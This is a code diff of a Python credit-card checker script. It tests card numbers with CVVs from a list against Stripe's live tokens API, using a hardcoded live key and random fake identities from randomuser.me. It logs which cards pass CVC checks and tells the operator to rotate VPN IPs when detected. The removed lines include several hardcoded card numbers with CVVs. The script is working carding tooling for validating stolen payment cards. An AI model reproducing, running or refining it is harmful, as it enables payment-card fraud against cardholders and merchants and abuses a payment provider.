@@ -3,16 +3,15 @@ import json
 import requests
 
 
-succcess = open("cvc.txt","a")
-checked = open("checkcards.txt","a")
-othercards = open("othercards.txt","a")
+succcess = open("python3.8/cvc.txt", "a")
+checked = open("python3.8/checkcards.txt", "a")
+othercards = open("python3.8/othercards.txt", "a")
 
 def getnumber():
     read = open("num.txt","r")
     lines = read.readlines()
     num = int(lines[0])
     return num
-
 
 
 def increment():
@@ -37,10 +36,9 @@ def decrement():
     read.close()
     write.close()
 
-def randomizer():
+def randomizer(): #This is to randomize the request content
     randomocontent = requests.get('https://randomuser.me/api/1.2/?nat=us')
     jsonrandom = randomocontent.json()
-    #print(jsonrandom["results"][0]["location"]["state"])
     return jsonrandom
 
 
@@ -55,6 +53,7 @@ def checker(cc,jsonrandom):
     sid = '731a3414-ff88-440a-b64e-f77a878f71b2'
 
     firstname = jsonrandom["results"][0]["name"]["first"]
+
     lastname = jsonrandom["results"][0]["name"]["last"]
     street = jsonrandom["results"][0]["location"]["street"]
 
@@ -65,9 +64,6 @@ def checker(cc,jsonrandom):
     email = jsonrandom["results"][0]["email"]
 
     state = jsonrandom["results"][0]["location"]["state"]
-
-
-    #print(cvv)
 
     url  = 'https://api.stripe.com/v1/tokens'
     headers = {
@@ -105,15 +101,12 @@ def checker(cc,jsonrandom):
     'sid':  sid,#'6a909e32-d576-4bac-bf88-5372ac3e3ead',
     'key': 'pk_live_eBee6q6n88Q6DCAatTPCOycn00XBRXLwKV'
     }
-    proxydict = {'http':'http://192.225.214.132:80','https':'http://192.225.214.132:80'}
     responser = requests.post(url,headers=headers,data=data)
-    #print(responser)
-    #print(responser.status_code)
     jsonrespone = responser.json()
     if(responser.status_code == 200):
         #print("CC is Valid")
         if(jsonrespone["card"]["cvc_check"] == "unavailable"):
-            print("Proxy Error")
+            print("Proxy Error - Chnage your IP and restart the checker")
             decrement()
 
 
@@ -127,99 +120,59 @@ def checker(cc,jsonrandom):
             succcess.write(responser.text)
             print(cc)
 
-
+        #This means the Proxy is Dead (Change the IP of your VPN)
         elif(jsonrespone["card"]["cvc_check"] == "unchecked"):
-            checked.write(cc)
-            checked.write('\n')
-            decrement()
+            print("Proxy Error - Change your IP and restart the checker")
+            decrement() # Since this card has not been Checked , the Checked list count will decrement
+            #By this way no card in the list will be left unchecked.
 
 
-        print(jsonrespone["card"]["cvc_check"])
+        #print(jsonrespone["card"]["cvc_check"])
         #print(cc)
         #print(jsonrespone)
+
+
     elif (responser.status_code == 402):
         if(jsonrespone["error"]["code"] == "incorrect_cvc"):
-            print("CCN")
+            print("CCN Found ")
             checked.write(cc)
             checked.write('\n')
-            succcess.write(cc+"----")
+            succcess.write(cc)
             succcess.write(responser.text)
         elif(jsonrespone["error"]["code"] == "card_declined"):
+            print("Card Declined - "+str(cc))
             checked.write(cc)
             checked.write('\n')
             othercards.write(cc)
             othercards.write(responser.text)
             othercards.write("------------------------------------------------------------------------")
+        elif(jsonrespone["error"]["code"] == "expired_card"):
+            checked.write(cc)
+            checked.write('\n')
+            print("Expired Card - "+str(cc))
 
 
-        print(jsonrespone)
-
-    print(jsonrespone)
+    #print(jsonrespone)
 
 
-cc = '379286712851003|06|2023|8742'
-cc1 = '379286837451002|07|2023|1856'
-cc2 = '379286484061005|10|2023|5780'
-cc3 = '379286802261006|11|2025|5021'
-
-#checker(cc3,randomizer())
-#checker(cc2,randomizer())
-#checker(cc1,randomizer())
-#checker(cc,randomizer())
-#checker()
-
-def split(cc):
-    splitones = cc.split('|')
-    print(splitones[0])
-
-
-
-#split('32176321|3213|321')
-
+#Driver Program
 
 
 def main():
+    cards  = 100 #Update this variable with the number of cards you want to Check
     f = open('list.txt', 'r')
     lines = f.readlines()
     num = getnumber()
     f.close()
 
-    for x in range(0,100):
+    for x in range(0,cards): #Getting each Card from the list.txt
         cc = lines[num]
         cc = cc[0:28]
-
-        #print(f.read(29))
-        #print(cc)
-
         checker(cc,randomizer())
-        increment()
-
-
-
+        increment() #This is to Increment the CC count
         print('--------------------------------------------------------------------'+str(num)+'------------------------------------------')
         num = num + 1
-        #cc = str(f.read(x))
-        #print(cc)
 
-#main()
+
 main()
 
-
-
-
-
-
-#firstname = jsonrandom["results"][0]["name"]["first"]
-
-
-#lastname = jsonrandom["results"][0]["name"]["last"]
-#street = jsonrandom["results"][0]["location"]["street"]
-#city = jsonrandom["results"][0]["location"]["city"]
-#postcode = jsonrandom["results"][0]["location"]["postcode"]
-#email  = jsonrandom["results"][0]["email"]
-#state = jsonrandom["results"][0]["location"]["state"]
-
-
-
-
-#randomizer()
